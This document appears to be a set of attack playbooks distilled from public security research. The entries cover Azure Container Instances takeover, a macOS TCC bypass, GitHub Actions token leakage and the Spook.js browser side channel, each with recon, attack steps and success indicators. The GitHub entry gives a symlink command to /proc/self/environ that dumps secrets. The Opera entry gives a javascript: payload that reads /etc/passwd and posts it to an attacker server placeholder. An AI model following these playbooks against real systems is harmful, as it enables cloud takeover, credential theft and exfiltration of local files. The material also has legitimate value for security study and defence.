meta.title: Finding Azurescape – Cross-Account Container Takeover in Azure Container Instances

trigger_conditions.when_to_apply: When a malicious Azure user is able to deploy a container to Azure Container Instances (ACI) and can potentially access the underlying multitenant Kubernetes cluster.
prerequisites: Attacker is a malicious Azure customer.
ACI is hosted on Kubernetes clusters.
applicability_signals: The target is Azure Container Instances.
The underlying infrastructure is identified as Kubernetes.
The container runtime is identified as runC.
skip_if: ACI is not hosted on Kubernetes.
The container runtime is not runC or is patched against CVE-2019-5736.

recon_steps: Step 1: Deploy a container image to ACI designed to identify the underlying container runtime (e.g., a custom image like 'WhoC' that reads the container runtime, similar to CVE-2019-5736 research).
Step 2: Analyze the retrieved container runtime information to confirm it is runC.
attack_steps: Step 1: Leverage a design flaw in Linux containers to read the host's container runtime, potentially exploiting vulnerabilities like CVE-2019-5736 (though the writeup focuses on reading, not overwriting).
Step 2: Escape the container environment.
Step 3: Acquire a privileged Kubernetes service account token.
Step 4: Take over the Kubernetes API server.
Step 5: Gain complete control over the multitenant cluster and all customer containers.
payloads_or_patterns: Insufficient detail in writeup: The specific exploit mechanism for escaping the container and acquiring the service account token is not detailed, but it implies interaction with the host's container runtime.
Insufficient detail in writeup: Payloads for Kubernetes API server takeover are not provided but would involve standard Kubernetes exploitation techniques using the acquired token.
tools_recommended: Insufficient detail in writeup: Tools for container introspection and Kubernetes exploitation would be relevant.
success_indicators: Gaining control over other users' containers.
Stealing customer secrets and images deployed to the platform.
Abuse of ACI infrastructure for cryptomining.
Full control over the multitenant cluster.
failure_indicators: Container escape is not achieved.
Unable to acquire a privileged Kubernetes service account token.
Kubernetes API server is not compromised.
Palo Alto Networks noted that Microsoft patched ACI shortly after disclosure, so newer versions may be protected.

playbooks.impact: Attacker can execute code on other users' containers, steal customer secrets and images deployed to the platform, and abuse ACI's infrastructure for cryptomining. This leads to complete compromise of the multitenant Kubernetes cluster and all containers within it.
playbooks.key_lesson: Investigate container runtime vulnerabilities and host-level interactions to identify potential container escape vectors in CaaS platforms, especially when running on shared or multitenant infrastructure.

meta.title: Change home directory and bypass TCC aka CVE-2020-27937

trigger_conditions.when_to_apply: When an attacker can modify user records via the Open Directory framework, specifically the NFSHomeDirectory variable, while also possessing the kTCCServiceSystemPolicySysAdminFiles entitlement.
prerequisites: The `Directory Utility.app` must be executable and have the `com.apple.private.tcc.allow: kTCCServiceSystemPolicySysAdminFiles` entitlement.
The `Directory Utility.app` must not have hardened runtime or library validation flags enabled.
The attacker must be able to execute code on the target macOS system.
applicability_signals: Observing that `Directory Utility.app` has the `com.apple.private.tcc.allow: kTCCServiceSystemPolicySysAdminFiles` entitlement.
Confirming `codesign -d -vv /System/Library/CoreServices/Applications/Directory Utility.app` shows flags set to `0x0 (none)`.
skip_if: If `Directory Utility.app` has hardened runtime enabled.
If TCC framework is updated to not rely on `getpwuid` for home directory information.

recon_steps: Step 1: Inspect the entitlements of `/System/Library/CoreServices/Applications/Directory Utility.app` using `codesign -d -vv /System/Library/CoreServices/Applications/Directory Utility.app` to verify the `com.apple.private.tcc.allow: kTCCServiceSystemPolicySysAdminFiles` entitlement and check for hardened runtime flags.
attack_steps: Step 1: Inject malicious code or a plugin into `Directory Utility.app` that leverages the `kTCCServiceSystemPolicySysAdminFiles` entitlement.

Step 2: Utilize the injected code to modify the `NFSHomeDirectory` variable within the user's records accessed via the Open Directory framework (e.g., `/var/db/dslocal/nodes/Default/users/<username>.plist`).
Step 3: Set the `NFSHomeDirectory` to a path controlled by the attacker, which would then host a malicious TCC database.
Step 4: Trigger operations that require TCC access (e.g., attempting to access Photos, Documents) through applications that would now use the attacker-controlled home directory and TCC database.
payloads_or_patterns: Exploit code that targets the Open Directory framework to modify the NFSHomeDirectory variable. Specific payload will depend on the injection vector into Directory Utility.app.
tools_recommended: Mach-O analysis tools (e.g., Hopper, IDA Pro) to reverse engineer `Directory Utility.app` and identify injection points.
System modification tools to alter user records and create a custom TCC database.
Scripting languages (e.g., Python, shell scripting) for automation.
success_indicators: Successful modification of the `NFSHomeDirectory` variable in user records.
Access to sensitive user data (e.g., Desktop, Documents, Photos, Address Book, Camera, Microphone) that would normally be protected by TCC.
Applications performing actions that require TCC access without user prompts or denials.
failure_indicators: Inability to inject code into `Directory Utility.app` due to hardened runtime.
Failure to modify user records via Open Directory framework.
TCC still enforcing restrictions despite the modified home directory (indicating a fix or bypass of the specific `getpwuid` reliance).

playbooks.impact: Complete bypass of user-level Transparency, Consent, and Control (TCC) restrictions, granting unauthorized access to sensitive user data including Desktop, Documents, Address Book, Camera, Microphone, Photos, and potentially other system resources.
playbooks.key_lesson: Investigate applications with `kTCCServiceSystemPolicySysAdminFiles` entitlements, as they may have the ability to modify critical system configurations that can lead to TCC bypasses, especially if they rely on user-specific configuration files like home directories.

meta.title: GitHub Actions check-spelling community workflow - GITHUB_TOKEN leakage via advice.txt symlink

trigger_conditions.when_to_apply: When a GitHub repository uses the `check-spelling` community workflow and allows arbitrary file uploads or content manipulation within pull requests.
prerequisites: Attacker must be able to create a Pull Request in the target repository.
The target repository must have the `check-spelling` community workflow enabled.
applicability_signals: The presence of `.github/workflows/check-spelling.yml` or similar configuration for the check-spelling workflow.
The ability to create a pull request in the target repository.
skip_if: The `check-spelling` workflow is not enabled or configured in the target repository.
The repository has very strict file upload or PR content restrictions that prevent symlink creation.

recon_steps: Step 1: Identify GitHub repositories that are known to use the `check-spelling` community workflow. (e.g., based on the writeup, `imazen/imageflow`, `jekyll/jekyll`, `microsoft/Po` are mentioned as examples).
attack_steps: Step 1: Create a new branch in the target repository (or a fork of it if direct contribution is not possible).
Step 2: Create a malicious file named `.github/actions/advice.txt` in the root of the repository.
Step 3: Make this file a symbolic link pointing to `/proc/self/environ`.
Step 4: Create a dummy file (e.g., `spelling_error.txt`) that will intentionally contain a spelling error, and add it to the repository.
Step 5: Create a Pull Request from the malicious branch to the main branch of the target repository, ensuring the spelling error is present.
Step 6: Monitor the Pull Request comments for the output from the `check-spelling` workflow.
payloads_or_patterns: Symlink creation command: `ln -s /proc/self/environ .github/actions/advice.txt` (this command would be executed within the Git commit context that creates the file). The actual commit would contain the file `.github/actions/advice.txt` with content that is a symlink to `/proc/self/environ`.
Example malicious file content structure (within the commit): `.github/actions/advice.txt` -> `/proc/self/environ`
Example file to trigger the workflow: `test.md` with content like `This is a testt with a spelling error.`
tools_recommended: Git: for creating branches, commits, and pull requests.
A text editor: for creating the malicious files and spelling errors.
success_indicators: The `check-spelling` workflow posts a comment on the Pull Request that contains a dump of the GitHub Actions environment variables.
The dumped environment variables include a `GITHUB_TOKEN` with read/write permissions for the repository.
failure_indicators: The `check-spelling` workflow runs but does not produce any output containing environment variables.
The Pull Request is closed or rejected without the workflow running successfully. -> Re-evaluate symlink creation method or check if `check-spelling` workflow is actually active.

The workflow fails with an error message indicating it cannot process the symlink or access `/proc/self/environ`. -> The repository may have specific configurations or a WAF that prevents this type of attack, explore alternative information disclosure vectors.

playbooks.impact: An attacker can retrieve a short-lived `GITHUB_TOKEN` for the target repository. This token can be used to perform sensitive operations on behalf of the repository, including deleting comments in any Pull Request thread, merging any Pull Request (even the one that triggered the workflow), publishing releases with arbitrary assets, and creating/updating tags. This can lead to code injection, unauthorized changes, and disruption of the project.
playbooks.key_lesson: When analyzing GitHub Actions workflows, examine how they handle user-supplied input or repository content, particularly file paths and symlinks, as these can be leveraged for information disclosure or privilege escalation.

meta.title: Spook.js: Attacking Google Chrome's Strict Site Isolation via Speculative Execution and Type Confusion
meta.authors: Ayush Agarwal, Sioli O'Connell, Jason Kim, Shaked Yehezkel, Daniel Genkin, Eyal Ronen, Yuval Yarom

tech_stack_fingerprints: User is browsing with Google Chrome
Execution environment is within a web browser tab

trigger_conditions.when_to_apply: This attack is applicable when a user is running Google Chrome, especially on Intel processors or Apple M1 chips, and has sensitive information such as autofilled credentials or is viewing content from the same site in multiple tabs.
prerequisites: Target machine is running Google Chrome
Target processor is Intel or Apple M1 (expected to work on AMD)
The attacker can host a malicious webpage that the victim visits.
applicability_signals: Victim is using Chrome browser
Victim has autofilled credentials in Chrome
Victim has multiple tabs open from the same website
skip_if: Browser is not Google Chrome
Processor is not vulnerable to speculative execution side-channel attacks (though the writeup implies broad applicability)

recon_steps: Step 1: Confirm the target is using Google Chrome by observing browser user agent strings or by embedding JavaScript that checks the navigator.userAgent property.
Step 2: Identify if the target has autofilled credentials in Chrome by observing the browser's behavior on login forms or by leveraging known patterns of credential manager integration.
Step 3: For extension attacks, identify if the target has installed specific, vulnerable Chrome extensions (e.g., credential managers like LastPass).
attack_steps: Step 1: Host a malicious JavaScript payload (Spook.js) on a website controlled by the attacker.
Step 2: Induce the victim to visit the attacker's malicious website.

Step 3: The Spook.js code, once executed in the victim's browser, exploits transient execution side-channel vulnerabilities and type confusion to gain access to memory regions of other same-site tabs or extensions.
Step 4: Use the obtained memory access to read sensitive information such as autofilled credentials, displayed website content, or data within other Chrome extensions.
payloads_or_patterns: The Spook.js JavaScript code itself (specific implementation details are in the research paper, not provided in the writeup excerpt).
Malicious Chrome extension packaging for attacking other extensions.
tools_recommended: A web server to host the malicious JavaScript payload.
Malicious Chrome extension packaging tools (if targeting extensions).
success_indicators: Successful recovery of autofilled usernames and passwords from login pages.
Retrieval of sensitive information displayed on other same-site tabs (e.g., bank details, personal information).
Successful exfiltration of data from targeted Chrome extensions (e.g., master password from a credential manager).
failure_indicators: The Spook.js code fails to execute or extract any information, potentially due to browser patches or specific hardware configurations.
The attacker-controlled page is rendered in a separate process that cannot be accessed by the Spook.js exploit (mitigation).

playbooks.impact: An attacker can potentially steal sensitive information from a victim's browser sessions, including autofilled login credentials, financial data displayed on websites, and data stored within other browser extensions, leading to account compromise and financial loss.
playbooks.key_lesson: Even with browser security mitigations like Strict Site Isolation, transient execution side-channel attacks can still enable information leakage across process boundaries by exploiting speculative execution and type confusion vulnerabilities.

meta.title: Local File Read via Stored XSS in The Opera Browser

trigger_conditions.when_to_apply: When the target application uses a privileged URI scheme (like 'opera:') that allows for the injection and execution of JavaScript.
prerequisites: User must be logged into an Opera account and able to create/manage Pinboards.
applicability_signals: The existence of the `opera:pinboards` URI scheme.
The ability to add external links to Pinboards.
The `target=_blank` attribute on pinboard links, suggesting a need for modifier keys (Ctrl+Click/Middle-Click) for JS execution in the same tab.
skip_if: If the `opera:` URI scheme does not execute JavaScript.
If there's no mechanism to add external links to Pinboards.
If pinned links are always opened in a new tab and there's no way to force execution in the current tab.

recon_steps: Step 1: Identify new features in the Opera browser, specifically 'Opera Pinboards'.
Step 2: Inspect network requests made when adding a link to a Pinboard using a web proxy.
Step 3: Observe that the URI within the pin is parsed by the browser and sent to `pinboard.opera-api.com`.
attack_steps: Step 1: Attempt to add a `javascript:` URI as a pin to the Pinboard. Try `javascript:@opera.com`.
Step 2: If successful, confirm that the `javascript:` URI shows up as a clickable link in the pinboard.
Step 3: Craft a malicious `javascript:` payload, such as `javascript:'@opera.com/';alert(1)`, and attempt to execute it by Command (Ctrl) + Clicking or Middle-Clicking the pinned link.
Step 4: To achieve local file read and exfiltration, construct a JavaScript payload that leverages the privileged `opera:` scheme's access to native function calls.
Step 5: Use `chrome.tabs.create` to open a new tab with a `file:///` URI (e.g., `file:///etc/passwd`).
Step 6: Utilize the `opr.pinboardPrivate.getThumbnail` function (used for pinboard thumbnails) to capture a screenshot of the opened local file tab.
Step 7: Encode the screenshot as a base64 PNG.
Step 8: Send the base64-encoded screenshot to an attacker-controlled server.
Step 9: Package this entire process into a new pinboard that, when clicked (with modifier keys), executes the script to capture and send the screenshot.
payloads_or_patterns: javascript:chrome.tabs.create({url:"file:///etc/passwd"});setTimeout(() => { opr.pinboardPrivate.getThumbnail(window.open().location.href, (thumbnailData) => { fetch('<ATTACKER_SERVER_URL>/upload', { method: 'POST', body: JSON.stringify({ image: thumbnailData }) }); }); }, 2000);
tools_recommended: Web Proxy (e.g., Burp Suite, OWASP ZAP) for intercepting and analyzing HTTP requests.
A simple web server for receiving base64 encoded screenshots.
success_indicators: An alert box with '1' appears after Ctrl+Clicking a pinned link.
A screenshot of the local file (e.g., /etc/passwd) is successfully received by the attacker's server.
failure_indicators: The `javascript:` URI is not allowed or sanitized.
The `alert(1)` payload does not execute.
The `chrome.tabs.create` or `opr.pinboardPrivate.getThumbnail` functions are not available or do not work as expected within the `opera:` scheme.
The screenshot is not received by the attacker's server.

playbooks.impact: An attacker can steal sensitive local files from a victim's computer by tricking them into clicking a specially crafted link within their Opera Pinboard, leading to unauthorized data access.
playbooks.key_lesson: Investigate privileged URI schemes like 'opera:' and 'chrome:' for potential XSS vulnerabilities that can bypass SOP and access local files or browser functionalities.
